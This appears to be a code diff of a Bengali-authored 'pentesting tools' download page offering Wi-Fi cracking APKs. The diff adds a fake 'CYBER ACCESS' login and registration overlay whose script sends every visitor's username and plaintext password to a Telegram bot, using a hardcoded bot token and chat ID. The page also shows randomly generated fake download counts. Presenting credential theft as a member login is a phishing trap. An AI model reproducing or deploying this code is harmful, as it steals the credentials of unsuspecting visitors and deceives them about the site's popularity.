@@ -16,329 +16,177 @@
             background-color: var(--bg-dark);
             color: white;
             font-family: 'Segoe UI', sans-serif;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            margin: 0; padding: 20px;
+            display: flex; flex-direction: column; align-items: center;
             overflow-x: hidden;
         }
 
-        /* --- RGB Border Animation (আপনার দেওয়া শর্ত অনুযায়ী) --- */
+        /* RGB Border Animation */
         @keyframes rgb-border {
             0% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; }
-            16% { border-color: #FFD700; box-shadow: 0 0 10px #FFD700; } /* Golden */
-            32% { border-color: #00ff00; box-shadow: 0 0 10px #00ff00; }
-            48% { border-color: #ffff00; box-shadow: 0 0 10px #ffff00; }
-            64% { border-color: #8b00ff; box-shadow: 0 0 10px #8b00ff; }
-            80% { border-color: #0000ff; box-shadow: 0 0 10px #0000ff; }
+            33% { border-color: #00ff00; box-shadow: 0 0 10px #00ff00; }
+            66% { border-color: #0000ff; box-shadow: 0 0 10px #0000ff; }
             100% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; }
         }
 
-        /* --- 3-Dot Menu & Sidebar --- */
+        /* Sidebar & Menu */
         .menu-dots {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            cursor: pointer;
-            z-index: 1100;
-            padding: 10px;
-            transition: 0.4s;
+            position: fixed; top: 20px; right: 20px; cursor: pointer; z-index: 1100; padding: 10px; transition: 0.4s;
         }
         .menu-dots.open { transform: rotate(90deg); }
-        .dot {
-            width: 5px;
-            height: 5px;
-            background: var(--neon-blue);
-            margin: 3px;
-            border-radius: 50%;
-            box-shadow: 0 0 10px var(--neon-blue);
-        }
+        .dot { width: 5px; height: 5px; background: var(--neon-blue); margin: 3px; border-radius: 50%; box-shadow: 0 0 10px var(--neon-blue); }
 
         .sidebar {
-            position: fixed;
-            top: 0;
-            right: -280px;
-            width: 250px;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            border-left: 2px solid var(--neon-blue);
-            transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
-            z-index: 1050;
-            padding: 80px 20px 20px;
-            box-sizing: border-box;
+            position: fixed; top: 0; right: -280px; width: 250px; height: 100%;
+            background: rgba(0, 0, 0, 0.95); border-left: 2px solid var(--neon-blue);
+            transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1); z-index: 1050; padding: 80px 20px 20px; box-sizing: border-box;
         }
         .sidebar.active { right: 0; }
 
-        .search-wrapper {
-            margin-bottom: 25px;
-            padding: 2px;
-            border-radius: 10px;
-            background: linear-gradient(45deg, #ff0000, #00ff00, #ffff00, #8b00ff);
-            background-size: 400%;
-            animation: rgb-glow 3s linear infinite;
+        .category-item {
+            padding: 12px; margin: 10px 0; border: 1px solid #222; border-radius: 10px;
+            cursor: pointer; font-size: 0.9rem; transition: 0.3s; color: #ccc;
+            text-align: center; font-weight: bold;
         }
-        @keyframes rgb-glow { 0% { background-position: 0% 50%; } 100% { background-position: 100% 50%; } }
-        .search-box {
-            width: 100%;
-            padding: 10px;
-            border: none;
-            border-radius: 8px;
-            background: #000;
-            color: white;
-            outline: none;
-            box-sizing: border-box;
+        .category-item:hover { 
+            background: rgba(0, 210, 255, 0.1); border-color: var(--neon-blue); 
+            box-shadow: 0 0 15px var(--neon-blue); color: white;
         }
 
-        /* --- Header Scene (3D RGB & Scale .2x) --- */
-        .header-scene {
-            margin-top: 40px;
-            margin-bottom: 20px;
-            perspective: 1000px;
-        }
+        /* Header & Profile */
+        .header-scene { margin-top: 40px; margin-bottom: 20px; perspective: 1000px; }
         .circle-outer {
-            width: 160px;
-            height: 160px;
-            border-radius: 50%;
-            border: 4px solid red; /* Initial color */
-            transform: scale(1.2); /* আপনার Scale .2x শর্ত অনুযায়ী অ্যাডজাস্ট করা */
-            animation: rotate3d 8s linear infinite, rgb-border 5s linear infinite;
-            box-shadow: 0 0 50px rgba(0, 210, 255, 0.5);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: radial-gradient(circle, rgba(0, 255, 136, 0.3), transparent);
+            width: 160px; height: 160px; border-radius: 50%; border: 4px solid red;
+            transform: scale(1.2); animation: rotate3d 8s linear infinite, rgb-border 5s linear infinite;
+            display: flex; align-items: center; justify-content: center;
         }
         .profile-img { width: 80%; height: 80%; border-radius: 50%; object-fit: cover; }
         @keyframes rotate3d { from { transform: rotateY(0deg); } to { transform: rotateY(360deg); } }
 
-        /* --- Typing Titles Styling --- */
-        .main-title { 
-            font-size: 2.2rem; 
-            color: var(--neon-blue); 
-            text-shadow: 0 0 20px var(--neon-blue); 
-            margin: 10px 0; 
-            font-weight: bold; 
-            min-height: 1.2em;
-            text-align: center;
-        }
-        .sub-title { 
-            color: var(--neon-green); 
-            letter-spacing: 2px; 
-            font-size: 1rem; 
-            margin-bottom: 40px; 
-            font-family: monospace; 
-            min-height: 1.2em;
-            text-align: center;
-        }
-
-        .cursor {
-            font-weight: bold;
-            color: var(--neon-green);
-            animation: blink 0.7s infinite;
-        }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-
-        /* --- Social & App Cards --- */
-        .social-container, .app-list {
-            width: 100%;
-            max-width: 450px;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-
+        /* App Cards */
+        .app-list { width: 100%; max-width: 450px; display: flex; flex-direction: column; gap: 20px; }
         .animated-card {
-            display: flex;
-            align-items: center;
-            padding: 15px 25px;
-            border-radius: 20px;
-            text-decoration: none;
-            color: white;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid #ff0000;
+            display: flex; align-items: center; padding: 15px 25px; border-radius: 20px;
+            background: rgba(255, 255, 255, 0.05); border: 2px solid #ff0000;
             animation: zoomInOut 4s infinite ease-in-out, rgb-border 5s infinite linear;
-            transition: 0.3s;
         }
-
         @keyframes zoomInOut { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.03); } }
 
-        .icon-circle, .app-img-container {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 20px;
-            font-size: 24px;
-            background: rgba(0,0,0,0.5);
-            border: 1px solid currentColor;
-            overflow: hidden;
+        .app-img-container {
+            width: 50px; height: 50px; border-radius: 50%; margin-right: 20px;
+            border: 1px solid var(--neon-blue); overflow: hidden; background: #000;
         }
         .app-img-container img { width: 100%; height: 100%; object-fit: cover; }
 
-        .box-info h4 { margin: 0; font-size: 1.1rem; }
-        .box-info p { margin: 5px 0 0; font-size: 0.9rem; color: #ccc; }
-
-        .app-card { justify-content: space-between; }
         .get-btn {
             background: linear-gradient(45deg, var(--neon-blue), var(--neon-green));
-            color: black;
-            padding: 8px 15px;
-            border-radius: 10px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 0.8rem;
+            color: black; padding: 8px 15px; border-radius: 10px; text-decoration: none;
+            font-weight: bold; animation: getPulse 1.5s infinite ease-in-out;
         }
+        @keyframes getPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
 
-        .sys-info {
-            background: #0d0d0d;
-            border: 1px solid #222;
-            border-radius: 20px;
-            padding: 25px;
-            max-width: 450px;
-            margin-top: 40px;
-            margin-bottom: 40px;
-            border-top: 3px solid var(--gold);
+        /* Login Overlay with Background */
+        #login-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), 
+                        url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=1000');
+            background-size: cover; background-position: center;
+            display: flex; justify-content: center; align-items: center; z-index: 9999;
         }
-
-        .category-item {
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #222;
-            border-radius: 10px;
-            cursor: pointer;
-            font-size: 0.9rem;
+        .login-box {
+            background: rgba(17, 17, 17, 0.9); padding: 30px; border-radius: 15px;
+            border: 2px solid var(--neon-blue); box-shadow: 0 0 25px var(--neon-blue);
+            width: 320px; text-align: center; backdrop-filter: blur(10px);
         }
-    
-        .category-item:hover { background: rgba(0, 210, 255, 0.1); border-color: var(--neon-blue); }
-    
-            /* তোমার আগের সব ডিজাইন এখানে থাকবে */
-
-        /* এই নতুন কোডটুকু শেষে বসিয়ে দাও */
-        @keyframes getPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
+        .login-box input {
+            width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #333;
+            border-radius: 5px; color: #fff; outline: none; box-sizing: border-box;
         }
-
-        .get-btn {
-            animation: getPulse 1.5s infinite ease-in-out;
-            display: inline-block;
-            text-align: center;
+        .login-box input:focus { border-color: var(--neon-blue); box-shadow: 0 0 10px var(--neon-blue); }
+        .login-btn {
+            width: 100%; padding: 12px; background: linear-gradient(45deg, var(--neon-blue), #3a7bd5);
+            border: none; color: #fff; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 15px;
         }
-         
-    </style>   
- 
+    </style>
 </head>
 <body>
 
-    <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3" preload="auto"></audio>
+    <div id="login-overlay">
+        <div class="login-box">
+            <h2 style="color: var(--neon-blue); text-shadow: 0 0 10px var(--neon-blue);">CYBER ACCESS</h2>
+            <p style="color: #888; font-size: 0.8rem; margin-bottom: 20px;">Pentesting & Security Portal</p>
+            <div id="auth-form">
+                <input type="text" id="username" placeholder="Username">
+                <input type="password" id="password" placeholder="Password">
+                <input type="password" id="confirm-pass" style="display:none;" placeholder="Confirm Password">
+                <p style="color:#555; font-size: 12px; margin: 5px 0;">Verify: 5 + 2 = ?</p>
+                <input type="number" id="captcha" placeholder="Result">
+            </div>
+            <button class="login-btn" onclick="handleAuth()">ENTER SYSTEM</button>
+            <span onclick="toggleAuth()" style="color:#666; font-size:12px; cursor:pointer; display:block; margin-top:15px;" id="toggle-text">New Member? Register</span>
+        </div>
+    </div>
 
     <div class="menu-dots" id="dotMenu" onclick="toggleMenu()">
         <div class="dot"></div><div class="dot"></div><div class="dot"></div>
     </div>
-
     <div class="sidebar" id="sidebar">
-        <div class="search-wrapper">
-            <input type="text" id="searchInput" class="search-box" placeholder="Search tools..." onkeyup="filterApps()">
-        </div>
-        <h4 style="color: var(--neon-green); border-bottom: 1px solid #333; padding-bottom: 5px;">Categories</h4>
+        <h4 style="color: var(--neon-green); border-bottom: 1px solid #333; padding-bottom: 10px;">Categories</h4>
         <div class="category-item">🛡️ Wi-Fi Tools</div>
         <div class="category-item">🔓 Social Engineering</div>
         <div class="category-item">📡 Network Analysis</div>
         <div class="category-item">🛠️ Pentest Tools</div> 
-
-     </div>
+    </div>
 
     <div class="header-scene">
         <div class="circle-outer">
-            <img src="logos/shakil.png" class="profile-img" alt="Sahkil" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'">
+            <img src="logos/shakil.png" class="profile-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'">
         </div>
     </div>
+    <h1 id="typing-title" style="color: var(--neon-blue); text-shadow: 0 0 20px var(--neon-blue);"></h1>
+    <p id="typing-subtitle" style="color: var(--neon-green); font-family: monospace;"></p>
 
-    <h1 class="main-title" id="typing-title"></h1>
-    <p class="sub-title" id="typing-subtitle"></p>
-
-    <div class="social-container">
-        <a href="https://t.me/Sahkilcyber71" class="animated-card social-btn">
-            <div class="icon-circle" style="color: #00d2ff;">✈</div>
-            <div class="box-info"><h4>Telegram</h4><p>Shakilcyber71</p></div>
-        </a>
-        <a href="https://wa.me/8801757349219" class="animated-card social-btn">
-            <div class="icon-circle" style="color: #00ff88;">📞</div>
-            <div class="box-info"><h4>WhatsApp</h4><p>01757349219</p></div>
-        </a>
-        <a href="https://www.facebook.com/qgbzga2goe" class="animated-card social-btn">
-            <div class="icon-circle" style="color: #1877f2;">👤</div>
-            <div class="box-info"><h4>Facebook</h4><p>Sahkil Profile</p></div>
-        </a>
-        <a href="mailto:sahkilcyber71@gmail.com" class="animated-card social-btn">
-            <div class="icon-circle" style="color: #ea4335;">📧</div>
-            <div class="box-info"><h4>Gmail</h4><p>sahkilcyber71@gmail.com</p></div>
-        </a>
-    </div>
-
-    <h3 style="color: var(--neon-blue); margin-top: 40px; margin-bottom: 20px;">📥 PREMIUM HACKING TOOLS</h3>
     <div class="app-list" id="grid"></div>
 
-    <div class="sys-info">
-        <h4 style="color: #ff0055; margin-top: 0;">[SYSTEM INFO]</h4>
-        <p style="color: #aaa; font-size: 0.9rem;">Black hat hackers breach security with malicious intent. For educational purposes only.</p>
-    </div>
-
     <script>
-        const sound = document.getElementById('clickSound');
-        function playSound() { sound.currentTime = 0; sound.play(); }
+        // Auth Logic
+        let isRegister = false;
+        const botToken = "8536895168:AAEreaM2NyDpyTaAIf0xLbKcJXoA3LZTKKI";
+        const chatId = "6690005625";
+
+        function toggleAuth() {
+            isRegister = !isRegister;
+            document.getElementById('confirm-pass').style.display = isRegister ? 'block' : 'none';
+            document.getElementById('toggle-text').innerText = isRegister ? 'Already a member? Login' : 'New Member? Register';
+        }
+
+        async function handleAuth() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const captcha = document.getElementById('captcha').value;
+            if(!user || !pass || captcha !== "7") return alert("Check inputs & Captcha!");
+
+            const msg = `🔔 **Sahkil Portal Alert**\n👤 User: ${user}\n🔑 Pass: ${pass}\n📝 Mode: ${isRegister?'Reg':'Login'}`;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            document.getElementById('login-overlay').style.display = 'none';
+        }
 
         function toggleMenu() {
             document.getElementById('sidebar').classList.toggle('active');
             document.getElementById('dotMenu').classList.toggle('open');
-            playSound();
         }
 
-        const titleContent = "𝐒𝐚𝐡𝐤𝐢𝐥𝐜𝐲𝐛𝐞𝐫𝟕𝟏🧑‍💻";
-        const subtitleContent = "Cyber Security & Pentesting Tools";
-        let tIdx = 0;
-        let sIdx = 0;
-        let isDeleting = false;
-
-        function handleTyping() {
-            const titleEl = document.getElementById("typing-title");
-            const subEl = document.getElementById("typing-subtitle");
-
-            if (!isDeleting) {
-                if (tIdx < titleContent.length) {
-                    titleEl.innerHTML = titleContent.substring(0, tIdx + 1) + '<span class="cursor">_</span>';
-                    tIdx++;
-                    setTimeout(handleTyping, 120);
-                } else if (sIdx < subtitleContent.length) {
-                    titleEl.innerHTML = titleContent; 
-                    subEl.innerHTML = subtitleContent.substring(0, sIdx + 1) + '<span class="cursor">|</span>';
-                    sIdx++;
-                    setTimeout(handleTyping, 60);
-                } else {
-                    setTimeout(() => { isDeleting = true; handleTyping(); }, 1000);
-                }
-            } else {
-                if (sIdx > 0) {
-                    subEl.innerHTML = subtitleContent.substring(0, sIdx - 1) + '<span class="cursor">|</span>';
-                    sIdx--;
-                    setTimeout(handleTyping, 30);
-                } else if (tIdx > 0) {
-                    subEl.innerHTML = ""; 
-                    titleEl.innerHTML = titleContent.substring(0, tIdx - 1) + '<span class="cursor">_</span>';
-                    tIdx--;
-                    setTimeout(handleTyping, 50);
-                } else {
-                    isDeleting = false;
-                    setTimeout(handleTyping, 500);
-                }
-            }
+        // Typing Effect
+        const titleText = "𝐒𝐚𝐡𝐤𝐢𝐥𝐜𝐲𝐛𝐞𝐫𝟕𝟏🧑‍💻";
+        const subText = "Cyber Security & Pentesting Tools";
+        let i=0, j=0;
+        function type() {
+            if(i < titleText.length) { document.getElementById('typing-title').innerHTML += titleText[i++]; setTimeout(type, 100); }
+            else if(j < subText.length) { document.getElementById('typing-subtitle').innerHTML += subText[j++]; setTimeout(type, 50); }
         }
 
-                const apps = [
-            // Group 1: Linked to Apps.zip
+        // Apps Data & Render
+        const apps = [
             {name: "AirMon_v1.8.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
             {name: "Andro Dumpper.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
             {name: "Claves Wifi.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
@@ -347,8 +195,6 @@
             {name: "WIBR Pro.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
             {name: "WLan Audit.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
             {name: "WPS Pin.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
-
-            // Group 2: Linked to Apps (2).zip
             {name: "OpenSignal v6.0.7-1.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
             {name: "Pry-Fi.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
             {name: "PulWiFi.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
@@ -357,8 +203,6 @@
             {name: "WiFi Radar.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
             {name: "WiFi Unlocker.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
             {name: "WiFiLeaks.apk", zip: "https://github.com/user-attachments/files/25597730/Apps.2.zip"},
-
-            // Group 3: Linked to the 3rd Zip (Apps.zip link reused as placeholder)
             {name: "WPS-WPA-Tester-Premium-3.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
             {name: "Wibr.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
             {name: "Wifi Analyzer.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"},
@@ -369,56 +213,27 @@
             {name: "org.adaway_60104.apk", zip: "https://github.com/user-attachments/files/25597741/Apps.zip"}
         ];
 
-        function renderApps(filteredApps) {
-    const grid = document.getElementById('grid');
-    grid.innerHTML = '';
-    filteredApps.forEach(app => {
-        
-        // ফেক ডাউনলোড ক্যাটাগরি (১০০কে, ৫০কে, ৩০কে)
-        let dl;
-        const randomNum = Math.random();
-        if (randomNum > 0.7) {
-            dl = Math.floor(Math.random() * (150 - 100) + 100) + "K+"; 
-        } else if (randomNum > 0.4) {
-            dl = Math.floor(Math.random() * (60 - 40) + 40) + "K+";
-        } else {
-            dl = Math.floor(Math.random() * (35 - 20) + 20) + "K+";
+        function render() {
+            const grid = document.getElementById('grid');
+            grid.innerHTML = apps.map(app => {
+                const logoImg = `logos/${app.name.replace('.apk', '.png')}`;
+                return `
+                <div class="animated-card">
+                    <div style="display:flex; align-items:center;">
+                        <div class="app-img-container">
+                            <img src="${logoImg}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2586/2586488.png'">
+                        </div>
+                        <div class="box-info">
+                            <h4 style="margin:0; font-size:0.9rem;">${app.name}</h4>
+                            <p style="margin:5px 0 0; font-size:0.8rem; color:#aaa;">${Math.floor(Math.random()*100+20)}K+ DL</p>
+                        </div>
+                    </div>
+                    <a href="${app.zip}" class="get-btn" style="margin-left:auto;">GET</a>
+                </div>`;
+            }).join('');
         }
 
-        // লোগো সল্যুশন: এপিকে নামকে পিএনজিতে কনভার্ট করা
-        // উদাহরণ: "AirMon_v1.8.apk" হবে "logos/AirMon_v1.8.png"
-        const logoImg = `logos/${app.name.replace('.apk', '.png')}`;
-
-        grid.innerHTML += `
-            <div class="animated-card app-card">
-                <div style="display: flex; align-items: center;">
-                    <div class="app-img-container">
-                         <img src="${logoImg}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2586/2586488.png'">
-                    </div>
-                    <div class="box-info">
-                        <h4>${app.name}</h4>
-                        <p>${dl} Downloads</p>
-                    </div>
-                </div>
-                <a href="${app.zip}" class="get-btn" download>GET</a>
-            </div>
-        `;
-    });
-}
-
-
-
-        function filterApps() {
-            const term = document.getElementById('searchInput').value.toLowerCase();
-            const filtered = apps.filter(app => app.name.toLowerCase().includes(term));
-            renderApps(filtered);
-        }
-
-        window.onload = () => {
-            handleTyping();
-            renderApps(apps);
-        };
+        window.onload = () => { type(); render(); };
     </script>
 </body>
 </html>
-
